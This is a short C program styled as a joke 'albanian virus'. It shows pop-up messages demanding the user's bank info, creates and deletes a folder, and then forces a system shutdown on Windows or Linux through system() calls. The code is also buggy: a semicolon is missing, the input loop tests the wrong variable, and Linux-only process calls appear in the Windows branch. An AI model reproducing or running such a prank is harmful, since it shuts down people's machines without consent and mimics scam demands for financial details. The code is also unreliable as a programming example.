#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
//#include <windows.h>
#include <unistd.h>
int x = 0 ;
int main(){
  printf("Give 1 for windows and 0 for linux: ");
  int correctInput = 0;
  scanf("%d", &correctInput);
  printf("\n")
  while (correctInput != 0 && correctInput != 1){
    printf("Please provide a valid input\n");
    printf("Give 1 for windows and 0 for linux: ");
    correctInput = scanf("%d", &x);
  }
  



  if(x == 1){
    system("msg \"kurwa\"");
    FILE *fp = popen("pidof msg", "r");
      if (fp != NULL) {
          int pid;
          if (fscanf(fp, "%d", &pid) == 1) {
              kill(pid, SIGTERM);  // Terminate gxmessage
              printf("gxmessage terminated.\n");
          }
          pclose(fp);
      }

    sleep(2);
    system("mkdir albanian_virus");
    sleep(10);
    system("rmdir albanian_virus");
    sleep(3);
    
    system("C:\\Windows\\System32\\shutdown /i");
    return 0;




  }else if(x == 0 ){
    system("gxmessage \"This is an albanian virus , don't attempt to close this or you will face my wrath. I am a poor virus so if you would be so kind to wire me your bank info\"");

     FILE *fp = popen("pidof gxmessage", "r");
      if (fp != NULL) {
          int pid;
          if (fscanf(fp, "%d", &pid) == 1) {
              kill(pid, SIGTERM);  // Terminate gxmessage
              printf("gxmessage terminated.\n");
          }
          pclose(fp);
      }
    system("gxmessage \"Last warning, wire me the info or face doom!!\"");

     FILE *hp = popen("pidof gxmessage", "r");
      if (hp != NULL) {
          int pid;
          if (fscanf(hp, "%d", &pid) == 1) {
              kill(pid, SIGTERM);  // Terminate gxmessage
              printf("gxmessage terminated.\n");
          }
          pclose(hp);
      }
    sleep(2);
    system("mkdir albanian_virus");
    sleep(5);
    system("rmdir albanian_virus");
    sleep(3);
    system("exit");
    sleep(3);
    system("sudo shutdown -P now");
    sleep(3);
    printf("mousedran1");
    system("\n");

      return 0;
  }
}
